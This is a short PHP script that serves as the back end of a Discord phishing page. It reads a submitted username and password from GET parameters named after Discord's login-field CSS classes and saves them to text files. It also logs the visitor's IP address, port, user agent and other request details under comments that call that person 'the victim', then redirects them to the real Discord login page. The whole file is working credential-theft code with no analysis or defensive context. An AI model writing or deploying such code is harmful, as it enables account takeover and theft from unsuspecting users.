<?php
header("Location: https://www.discordapp.com/login");
$IP = $_SERVER['REMOTE_ADDR'];
$proto = $_SERVER['SERVER_PROTOCOL']; 
$BROWSER = $_SERVER['HTTP_USER_AGENT'];
$SOFTWARE = $_SERVER['SERVER_SOFTWARE'];
$HTTACCEPT = $_SERVER['HTTP_ACCEPT'];
$REQ_METH = $_SERVER['REQUEST_METHOD'];
$REM_PRT = $_SERVER['REMOTE_PORT'];
$REM_USR = $_SERVER['REMOTE_USER'];
$rem_uri = $_SERVER['REQUEST_URI'];
$USER_NAME = $_GET['inputDefault-_djjkz input-cIJ7To inputField-4g7rSQ'];
$USER_PASS = $_GET['inputDefault-_djjkz input-cIJ7To'];
$i = fopen("username.txt" , "w+a");
if(isset($USER_NAME)){
    fwrite($i, "$USER_NAME IS the username."); // << Requires an update
    fwrite($i, "$USER_PASS");
}
//inputWrapper-31_8H8 the class name for both username and passwd

$fi = fopen("password.txt" , "w+a");
fwrite($fi, "$IP is the remote host's IP\n");
fwrite($fi, "$proto is the Protocol used on the victim machine.\n");
fwrite($fi, "$HTTACCEPT Is the Accept Header");
$fo = fopen("Information.txt" , "w+a");
fwrite($fo, "\n$BROWSER Is the victims USER AGENT");
fwrite($fo, "\n$SOFTWARE Is the victim's Connection");
fwrite($fo, "\n$REQ_METH Is the victim's Request Method.");
fwrite($fo, "\n$REM_PRT Is the victim's Port connected to.");
fwrite($fo, "\n$REM_USR Is and/or was the victim.");
fwrite($fo, "\n $rem_uri Is  or was the URI e.g: /home used.");


?>
